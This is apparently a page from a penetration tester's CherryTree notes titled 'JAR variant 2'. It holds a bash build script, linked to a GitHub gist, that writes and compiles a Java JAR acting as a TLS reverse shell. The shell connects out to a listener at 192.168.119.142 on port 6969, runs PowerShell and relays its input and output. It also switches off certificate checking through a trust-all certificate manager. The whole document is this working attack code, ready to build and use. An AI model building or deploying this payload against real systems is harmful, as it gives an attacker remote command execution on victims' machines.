<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>JAR variant 2</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  
    <script type="text/javascript">
        function in_frame () { try { return window.self !== window.top; } catch (e) { return true; } }
        if (!in_frame()) {
            var page = location.pathname.substring(location.pathname.lastIndexOf("/") + 1);
            window.location = 'index.html#' + page;
        }
    </script>
</head>
<body><div class="page"><h1 class="title">JAR variant 2</h1><br/><a href="https://gist.github.com/FrankSpierings/e330e3aea3152f816c202b883887dd60">https://gist.github.com/FrankSpierings/e330e3aea3152f816c202b883887dd60</a><br /><br /><br /><div class="codebox"><div class="codebox">#!/bin/bash<br />#&nbsp;This&nbsp;is&nbsp;not&nbsp;great...<br />#<br />NAME=Shell<br />TAC=TrustAllCertificates<br />LHOST=<span style="color:#ff0044;font-weight:400">192.168.119.142</span><br />LPORT=<span style="color:#ff0044;font-weight:400">6969</span><br />COMMAND='<span style="color:#3ad900;font-weight:400">"powershell"</span>'<br /><br />CURDIR=$(pwd)<br />BUILDDIR=$(mktemp&nbsp;-d)<br />cd&nbsp;<span style="color:#3ad900;font-weight:400">"${BUILDDIR}"</span><br /><br />cat&nbsp;&gt;&nbsp;<span style="color:#3ad900;font-weight:400">"${TAC}.java"</span>&nbsp;&lt;&lt;&nbsp;EOF<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.security.cert.CertificateException;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.security.cert.X509Certificate;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;javax.net.ssl.X509TrustManager;<br /><br /><span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">class</span>&nbsp;${TAC}&nbsp;<span style="color:#7f0044;font-weight:400">implements</span>&nbsp;X509TrustManager&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">void</span>&nbsp;checkClientTrusted(X509Certificate[]&nbsp;certs,&nbsp;String&nbsp;authType)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">void</span>&nbsp;checkServerTrusted(X509Certificate[]&nbsp;certs,&nbsp;String&nbsp;authType)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">public</span>&nbsp;X509Certificate[]&nbsp;getAcceptedIssuers()&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">return</span>&nbsp;<span style="color:#ff0044;font-weight:700">null</span>;<br />&nbsp;&nbsp;&nbsp;&nbsp;}<br />}<br />EOF<br /><br />cat&nbsp;&gt;&nbsp;<span style="color:#3ad900;font-weight:400">"${NAME}.java"</span>&nbsp;&lt;&lt;&nbsp;EOF<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.io.IOException;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.io.InputStream;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.io.OutputStream;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.net.Socket;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;javax.net.ssl.*;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.io.InputStreamReader;<br /><span style="color:#333333;font-weight:400">import</span>&nbsp;java.io.BufferedReader;<br /><br /><span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">class</span>&nbsp;${NAME}&nbsp;{<br />&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">public</span>&nbsp;<span style="color:#7f0044;font-weight:400">static</span>&nbsp;<span style="color:#7f0044;font-weight:400">void</span>&nbsp;main(String[]&nbsp;args)&nbsp;<span style="color:#7f0044;font-weight:400">throws</span>&nbsp;Exception&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;host&nbsp;=&nbsp;<span style="color:#3ad900;font-weight:400">"${LHOST}"</span>;<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#7f0044;font-weight:400">int</span>&nbsp;port&nbsp;=&nbsp;${LPORT};<br />&nbsp;&nbsp;&nbsp;&nbsp;String[]&nbsp;cmd&nbsp;=&nbsp;{${COMMAND}};<br /><br />&nbsp;&nbsp;&nbsp;&nbsp;Process&nbsp;p&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;ProcessBuilder(cmd).redirectErrorStream(<span style="color:#ff0044;font-weight:400">true</span>).start();<br />&nbsp;&nbsp;&nbsp;&nbsp;SSLContext&nbsp;sslContext&nbsp;=&nbsp;SSLContext.getInstance(<span style="color:#3ad900;font-weight:400">"TLS"</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;sslContext.init(<span style="color:#ff0044;font-weight:700">null</span>,&nbsp;<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;TrustManager[]&nbsp;{<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;${TAC}()},&nbsp;<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;java.security.SecureRandom());<br />&nbsp;&nbsp;&nbsp;&nbsp;SSLSocketFactory&nbsp;sslSocketFactory&nbsp;=&nbsp;sslContext.getSocketFactory();<br />&nbsp;&nbsp;&nbsp;&nbsp;SSLSocket&nbsp;s&nbsp;=&nbsp;(SSLSocket)&nbsp;sslSocketFactory.createSocket(host,&nbsp;port);<br />&nbsp;&nbsp;&nbsp;&nbsp;s.startHandshake();<br />&nbsp;&nbsp;&nbsp;&nbsp;InputStream&nbsp;pi&nbsp;=&nbsp;p.getInputStream(),&nbsp;pe&nbsp;=&nbsp;p.getErrorStream(),&nbsp;si&nbsp;=&nbsp;s.getInputStream();<br />&nbsp;&nbsp;&nbsp;&nbsp;BufferedReader&nbsp;bsi&nbsp;=&nbsp;<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;BufferedReader(<span style="color:#ff9d00;font-weight:700">new</span>&nbsp;InputStreamReader(s.getInputStream()));<br />&nbsp;&nbsp;&nbsp;&nbsp;OutputStream&nbsp;po&nbsp;=&nbsp;p.getOutputStream(),&nbsp;so&nbsp;=&nbsp;s.getOutputStream();<br />&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>(!s.isClosed())&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>(pi.available()&gt;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.write(pi.read());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">while</span>(pe.available()&gt;<span style="color:#ff0044;font-weight:400">0</span>)<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.write(pe.read());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;https://stackoverflow.com/questions/26320624/how-to-tell-if-java-sslsocket-has-data-available</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;while(si.available()&gt;0)</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#0088ff;font-weight:400">//&nbsp;po.write(si.read());</span><br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;String&nbsp;line&nbsp;=&nbsp;bsi.readLine();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">if</span>&nbsp;(line&nbsp;!=&nbsp;<span style="color:#ff0044;font-weight:700">null</span>)&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;po.write((line&nbsp;+&nbsp;<span style="color:#3ad900;font-weight:400">"\n"</span>).getBytes());<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">else</span>&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;bsi.close();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;so.flush();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;po.flush();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Thread.sleep(<span style="color:#ff0044;font-weight:400">50</span>);<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">try</span>&nbsp;{<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;p.exitValue();<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">break</span>;<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<span style="color:#ff9d00;font-weight:700">catch</span>&nbsp;(Exception&nbsp;e){<br />&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br />&nbsp;&nbsp;&nbsp;&nbsp;};<br />&nbsp;&nbsp;&nbsp;&nbsp;p.destroy();<br />&nbsp;&nbsp;&nbsp;&nbsp;s.close();<br />&nbsp;&nbsp;}<br />}<br />EOF<br />cat&nbsp;<span style="color:#3ad900;font-weight:400">"${TAC}.java"</span><br />cat&nbsp;<span style="color:#3ad900;font-weight:400">"${NAME}.java"</span><br />mkdir&nbsp;META-INF<br />echo&nbsp;<span style="color:#3ad900;font-weight:400">"Main-Class:&nbsp;${NAME}"</span>&nbsp;&gt;&nbsp;META-INF/MANIFEST.MF<br />javac&nbsp;--release&nbsp;<span style="color:#ff0044;font-weight:400">7</span>&nbsp;-d&nbsp;.&nbsp;*.java<br />jar&nbsp;cmvf&nbsp;META-INF/MANIFEST.MF&nbsp;shell.jar&nbsp;*.<span style="color:#7f0044;font-weight:400">class</span><br />mv&nbsp;shell.jar&nbsp;${CURDIR}/shell_$(date&nbsp;'+%s').jar<br />cd&nbsp;${CURDIR}<br />rm&nbsp;-rf&nbsp;<span style="color:#3ad900;font-weight:400">"${BUILDDIR}"</span></div></div></div></body></html>